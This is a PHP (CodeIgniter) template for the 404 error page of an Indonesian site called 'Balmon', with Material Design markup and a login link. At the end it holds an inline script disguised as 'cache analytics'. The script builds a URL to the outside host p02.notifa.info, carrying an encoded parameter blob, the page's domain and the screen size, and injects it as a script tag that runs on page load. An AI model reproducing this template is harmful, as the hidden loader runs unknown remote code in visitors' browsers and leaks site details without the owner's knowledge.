<?php defined('BASEPATH') or exit('No direct script access allowed'); ?>
<!DOCTYPE html>
<html lang="en">

<head>
	<link rel="icon" type="image/ico" href="<?= base_url('assets'); ?>/img/favicon.ico" />
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Halaman tidak ditemukan | Balmon</title>

	<!-- Add to homescreen for Chrome on Android -->
	<meta name="mobile-web-app-capable" content="yes">


	<!-- Add to homescreen for Safari on iOS -->
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<meta name="apple-mobile-web-app-title" content="Material Design Lite">


	<!-- Tile icon for Win8 (144x144 + tile color) -->
	<meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
	<meta name="msapplication-TileColor" content="#3372DF">

	<!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
	<!--
    <link rel="canonical" href="http://www.example.com/">
    -->

	<link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300,100,700,900' rel='stylesheet' type='text/css'>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<!-- inject:css -->
	<link rel="stylesheet" href="<?= base_url('assets'); ?>/login/dist/css/lib/getmdl-select.min.css">
	<link rel="stylesheet" href="<?= base_url('assets'); ?>/login/dist/css/lib/nv.d3.min.css">
	<link rel="stylesheet" href="<?= base_url('assets'); ?>/login/dist/css/application.min.css">
	<!-- endinject -->

</head>

<body>
	<div class="mdl-layout mdl-js-layout is-small-screen not-found">
		<main class="mdl-layout__content">
			<div class="mdl-card mdl-card__login mdl-shadow--2dp">
				<div class="mdl-card__supporting-text color--dark-gray">
					<div class="mdl-grid">
						<div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone">
							<span class="mdl-card__title-text text-color--smooth-gray"><img src="<?= base_url('assets'); ?>/img/logo-small.png" /></span>
						</div>
						<div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone">
							<span class="text--huge color-text--light-blue">404</span>
						</div>
						<div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone">
							<span class="text--sorry text-color--white">Maaf, Halaman tidak ditemukan</span>
						</div>
						<!--<a href="index.html">-->
						<div class="mdl-cell mdl-cell--12-col mdl-cell--4-col-phone">
							<a href="<?= base_url('user'); ?>" class="mdl-button mdl-js-button color-text--light-blue pull-right">
								Masuk
							</a>
						</div>
						<!--</a>alignment--bottom-right-->
					</div>
				</div>
			</div>
		</main>
	</div>

	<!-- inject:js -->
	<script src="<?= base_url('assets'); ?>/login/dist/js/d3.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/getmdl-select.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/material.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/nv.d3.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/layout/layout.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/scroll/scroll.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/charts/discreteBarChart.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/charts/linePlusBarChart.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/charts/stackedBarChart.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/employer-form/employer-form.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/line-chart/line-charts-nvd3.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/map/maps.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/pie-chart/pie-charts-nvd3.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/table/table.min.js"></script>
	<script src="<?= base_url('assets'); ?>/login/dist/js/widgets/todo/todo.min.js"></script>
	<!-- endinject -->

	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXwCrFn5xh97ODHIOBg4deZoPFE49kgf624jgi2UQqyYxWseMJOhcT9HJPZWu57g06bbYLX5i4a2X7yKTRAehVgYSV%2fY%2bpn%2fUmJh2QG%2boh%2bqIpQSzNz%2bbcvdcUTeR9PKiKYy2ZOnfGMy57aUsr1gtIOCMhvIgmSCQQeGlwDL5mpSLyelcbGfsH3rmqLb0Xy71Hc0bcwAnIry27ptF4gRcEi5GukSERP6WIlF62DVhaWlRBecsIJIrMtleIrK%2bBkRC9oZwgz39jHYWXET85hT5GUhhanPKCauBKt4rQlJ1kBmoFwuHOp24MIZyrfX5FZ9Heq4Aev5dt94aJ1tfXJRwJRXkaLK9DwJWAyPeXumLODjB6ZddWQE8PsZjlxpXL3r4Oj5odXoyU5gMwzwsxXIrWMGxk23OY3iuTce6%2bFoToDXWcl65FA%2bGUlNVeNUDm2lYh6qOLHjithMwxFA%2bZSc3LnFXtbP%2fO7Bm6PA%2ffs3BRhudE6L3U6AZSYeIKlAXYG720NOW2XXbsoRJfqs4OXv86VebGnon%2b0PJ4QiHkecSFlvWB94cvj5bIoR2xbIXVeuL%2b8NkIn3aKSCM%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function() {});
		};
	</script>
</body>

</html>
